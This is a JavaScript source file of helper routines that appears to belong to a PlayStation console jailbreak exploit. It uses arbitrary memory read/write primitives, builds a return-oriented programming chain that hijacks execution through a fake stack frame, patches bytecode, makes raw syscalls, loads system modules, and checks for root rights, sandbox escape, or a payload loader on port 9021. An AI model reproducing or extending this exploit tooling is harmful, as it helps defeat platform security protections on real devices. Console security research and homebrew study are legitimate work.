
// Write UTF-8 string to existing buffer
function write_string(addr, str) {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(str);
    
    for (let i = 0; i < bytes.length; i++) {
        write8(addr + BigInt(i), bytes[i]);
    }
    
    write8(addr + BigInt(bytes.length), 0);
}

function alloc_string(str) {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(str);
    const addr = malloc(bytes.length + 1);
    
    for (let i = 0; i < bytes.length; i++) {
        write8(addr + BigInt(i), bytes[i]);
    }
    
    write8(addr + BigInt(bytes.length), 0);
    
    return addr;
}

function send_notification(text) {
    const notify_buffer_size = 0xc30n;
    const notify_buffer = malloc(Number(notify_buffer_size));
    const icon_uri = "cxml://psnotification/tex_icon_system";
                        
    // Setup notification structure
    write32(notify_buffer + 0x0n, 0);           // type
    write32(notify_buffer + 0x28n, 0);          // unk3
    write32(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
    write32(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
    
    // Write message at offset 0x2D
    write_string(notify_buffer + 0x2dn, text);
    
    // Write icon URI at offset 0x42D
    write_string(notify_buffer + 0x42dn, icon_uri);
    
    // Open /dev/notification0
    const dev_path = alloc_string("/dev/notification0");
    const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
    
    if (Number(fd) < 0) {
        return;
    }
    
    syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
    syscall(SYSCALL.close, fd);
    
}

function get_error_string() {
    const error_func = call(libc_error);
    const errno = read64(error_func);
    const strerror = call(libc_strerror, errno);
    return Number(errno) + " " + read_null_terminated_string(strerror);
}


function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);
    
    write64(translate_name_mib, 0x300000000n);
    write64(size, BigInt(buf_size));
    
    const name_addr = alloc_string(name);
    const name_len = BigInt(name.length);
    
    if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
        throw new Error("failed to translate sysctl name to mib (" + name + ")");
    }
    
    if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
        return false;
    }
    
    return true;
}


function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64(size, 0x8n);
    
    if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
        const byte1 = Number(read8(buf + 2n));  // Minor version (first byte)
        const byte2 = Number(read8(buf + 3n));  // Major version (second byte)
        
        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }
    
    return null;
}

function call_pipe_rop(fildes) {
    let rop_i = 0;
    
    rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
    rop_chain[rop_i++] = SYSCALL.pipe;
    rop_chain[rop_i++] = syscall_wrapper;
    
    // Store rax (read_fd) to fildes[0]
    rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
    rop_chain[rop_i++] = fildes;
    rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
    
    // Store rdx (write_fd) to fildes[4]
    rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
    rop_chain[rop_i++] = fildes + 4n;
    rop_chain[rop_i++] = ROP.mov_qword_rdi_rdx; // mov qword [rdi], rdx ; ret
    
    // Return safe tagged value to JavaScript
    rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
    rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret
    rop_chain[rop_i++] = saved_fp;
    rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
    
    return pwn(fake_frame);
}

function create_pipe() {
    const fildes = malloc(0x10);
    
    const bc_start = get_bytecode_addr() + 0x36n;
    
    write64(bc_start, 0xAB0025n);
    saved_fp = addrof(call_pipe_rop(fildes)) + 0x1n;
    
    write64(bc_start, 0xAB00260325n);
    call_pipe_rop(fildes);
    
    const read_fd = read32(fildes);
    const write_fd = read32(fildes + 4n);

    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8(addr + BigInt(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8(addr + BigInt(i), buffer[i]);
    }
}

function read_null_terminated_string(addr) {
    const decoder = new TextDecoder('utf-8');
    let result = "";
    
    while (true) {
        const chunk = read_buffer(addr, 0x8);
        if (!chunk || chunk.length === 0) break;
        
        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }
        
        if (null_pos >= 0) {
            if (null_pos > 0) {
                result += decoder.decode(chunk.slice(0, null_pos));
            }
            return result;
        }
        
        result += decoder.decode(chunk, { stream: true });
        addr = addr + BigInt(chunk.length);
    }
    
    return result;
}

function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];
    
    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;
        
        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }
        
        if (match) matches.push(i);
    }
    
    return matches;
}

function get_current_ip() {
    // Get interface count
    const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
    if (count < 0) {
        return null;
    }
    
    // Allocate buffer for interfaces
    const iface_size = 0x1e0;
    const iface_buf = malloc(iface_size * count);
    
    // Get interface list
    if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
        return null;
    }
    
    // Parse interfaces
    for (let i = 0; i < count; i++) {
        const offset = BigInt(i * iface_size);
        
        // Read interface name (null-terminated string at offset 0)
        let iface_name = "";
        for (let j = 0; j < 16; j++) {
            const c = Number(read8(iface_buf + offset + BigInt(j)));
            if (c === 0) break;
            iface_name += String.fromCharCode(c);
        }
        
        // Read IP address (4 bytes at offset 0x28)
        const ip_offset = offset + 0x28n;
        const ip1 = Number(read8(iface_buf + ip_offset));
        const ip2 = Number(read8(iface_buf + ip_offset + 1n));
        const ip3 = Number(read8(iface_buf + ip_offset + 2n));
        const ip4 = Number(read8(iface_buf + ip_offset + 3n));
        const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
        
        // Check if this is eth0 or wlan0 with valid IP
        if ((iface_name === "eth0" || iface_name === "wlan0") && 
            iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
            return iface_ip;
        }
    }
    
    return null;
}

function is_jailbroken() {

    const cur_uid = syscall(SYSCALL.getuid);
    const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
    if (cur_uid === 0n && is_in_sandbox === 0n) {
        return true;
    } else {
        
        // Check if elfldr is running at 9021
        const sockaddr_in = malloc(16);
        const enable = malloc(4);
        
        const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
        if (sock_fd === 0xffffffffffffffffn) {
            throw new Error("socket failed: " + toHex(sock_fd));
        }
    
        try {
            write32(enable, 1);
            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
    
            write8(sockaddr_in + 1n, AF_INET);
            write16(sockaddr_in + 2n, 0x3D23n);      // port 9021
            write32(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
    
            // Try to connect to 127.0.0.1:9021
            const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
    
            if (ret === 0n) {
                syscall(SYSCALL.close, sock_fd);
                return true;
            } else {
                syscall(SYSCALL.close, sock_fd);
                return false;
            }
        } catch (e) {
            syscall(SYSCALL.close, sock_fd);
            return false;
        }
    }
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken")
    }
}

function load_prx(path) {
    const handle_out = malloc(4);
    const path_addr = alloc_string(path);

    const result = syscall(SYSCALL.dynlib_load_prx, path_addr, 0n, handle_out, 0n);
    if (result !== 0n) {
        throw new Error("dynlib_load_prx error: " + toHex(result));
    }

    return read32(handle_out);
}

function dlsym(handle, sym) {
    if (Number(FW_VERSION) >= 5) {
        check_jailbroken();
    }

    if (typeof sym !== "string") {
        throw new Error("dlsym expect string symbol name");
    }

    const sym_addr = alloc_string(sym);
    const addr_out = malloc(0x8n);

    const result = syscall(SYSCALL.dlsym, BigInt(handle), sym_addr, addr_out);
    if (result === 0xffffffffffffffffn) {
        throw new Error("dlsym error: " + toHex(result));
    }

    return read64(addr_out);
}

function get_title_id() {
    const sceKernelGetAppInfo = dlsym(LIBKERNEL_HANDLE, "sceKernelGetAppInfo");
    const pid = syscall(SYSCALL.getpid);

    const app_info = malloc(0x100n);
    const result = call(sceKernelGetAppInfo, pid, app_info);
    if (result !== 0n) {
        throw new Error("sceKernelGetAppInfo error: " + hex(result));
    }

    return read_null_terminated_string(app_info + 0x10n);
}

function find_mod_by_name(name) {
    const sceKernelGetModuleListInternal = dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleListInternal");
    const sceKernelGetModuleInfo = dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleInfo");

    const mem = malloc(4n * 0x300n);
    const actual_num = malloc(0x8n);

    call(sceKernelGetModuleListInternal, mem, 0x300n, actual_num);

    const num = read64(actual_num);
    for (let i = 0n; i < num; i++) {
        const handle = read32(mem + i * 4n);
        const info = malloc(0x160n);
        write64(info, 0x160n);

        call(sceKernelGetModuleInfo, handle, info);

        const mod_name = read_null_terminated_string(info + 0x8n);
        if (name === mod_name) {
            const base_addr = read64(info + 0x108n);
            return {
                handle: handle,
                base_addr: base_addr,
            };
        }
    }

    return null;
}


function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
    
    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + toHex(fd));
    }
    
    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + toHex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);
    
    write64(len_ptr, 0x255n);
    
    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + toHex(ret));        
    }
    
    return read_null_terminated_string(path_buffer);
}

